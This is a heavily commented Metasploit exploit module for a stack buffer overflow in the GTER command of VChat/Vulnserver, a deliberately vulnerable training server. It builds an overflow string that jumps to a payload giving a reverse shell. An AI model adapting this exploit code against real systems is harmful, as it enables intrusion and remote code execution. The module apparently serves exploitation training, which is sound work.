##
# The # symbol starts a comment
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
# File path: /usr/share/metasploit-framework/modules/exploit/windows/VChat/GTER_Reuse.rb
##
# This module exploits the GTER command of vulnerable chat server using manually derived shellcode.
##

class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module inheriting from the remote exploit class
  Rank = NormalRanking	# Potential impact to the target

  include Msf::Exploit::Remote::Tcp	# Include remote tcp exploit module

  def initialize(info = {})	# i.e. constructor, setting the initial values
    super(update_info(info,
      'Name'           => 'VChat/Vulnserver Buffer Overflow-GTER command Code Reuse',	# Name of the target
      'Description'    => %q{	# Explaining what the module does
         This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell. 
      },
      'Author'         => [ 'fxw' ],	## Hacker name
      'License'        => MSF_LICENSE,
      'References'     =>	# References for the vulnerability or exploit
        [
          #[ 'URL', 'https://github.com/DaintyJet/Making-Dos-DDoS-Metasploit-Module-Vulnserver/'],
          [ 'URL', 'https://github.com/DaintyJet/VChat_GTER_CodeReuse' ]

        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done 
        },      
      'Payload'        =>	# How to encode and generate the payload
        {
          'BadChars' => "\x00\x0a\x0d"	# Bad characters to avoid in generated shellcode
        },
      'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
      'Targets'        =>	#  targets for many exploits
      [
        [ 'EssFuncDLL-JMPESP',
          {
            'jmpesp' => 0x62501023 # This will be available in [target['jmpesp']]
          }
        ]
      ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public
      
      register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
          [
          OptInt.new('RETOFFSET_GTER', [true, 'Offset of Return Address in function GTER', 135]),
          OptString.new('SHORT_JUMP', [true, 'Short Jump Instruction, Provided in HEX Digits', "\xe9\x71\xff\xff\xff"]),
          Opt::RPORT(9999),
          Opt::RHOSTS('192.168.7.191')
      ])
      
  end
  def exploit	# Actual exploit
     
    relativeshort = datastore['SHORT_JUMP'].gsub(/\\x([0-9a-fA-F]{2})/) { $1.to_i(16).chr }

    print_status("Connecting to target...")
    connect	# Connect to the target

    outbound_GTER = 'GTER /.:/' + "\x90"*5 + "\x50"+ "\x5c" + payload + "\x90"*(datastore['RETOFFSET_GTER'] - 5 - 2 - payload.length()) + [target['jmpesp']].pack('V') + relativeshort # Create the malicious string that will be sent to the target


    print_status("Sending Exploit")
    sock.puts(outbound_GTER)	# Send the attacking payload
    disconnect
  end
end
